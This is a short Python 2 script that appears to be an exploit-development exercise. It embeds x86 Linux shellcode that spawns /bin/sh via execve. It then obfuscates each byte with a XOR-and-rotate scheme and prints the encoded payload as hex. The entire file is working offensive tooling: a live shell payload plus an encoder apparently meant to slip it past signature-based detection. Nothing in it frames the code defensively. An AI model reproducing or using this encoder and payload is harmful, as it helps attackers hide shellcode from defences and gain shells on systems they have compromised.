#!/usr/bin/env python

def ror(val,rot):
	return ((val & 0xff) >> rot % 8) | (val << (8 - (rot % 8)) & 0xff)


#shellcode executes execve("/bin/sh", 0, 0)
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89"
"\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


encoded = ""

x = len(bytearray(shellcode))

print 'Encoded shellcode ...\n'

for i in bytearray(shellcode):
	y = ror((i ^ x),2)
	encoded += "0x"
	encoded += "%02x," % y
	x -= 1

print 'Shellcode Lenght: %d\n\n' % len(bytearray(shellcode))
print encoded[:-1]
print '\n\n'
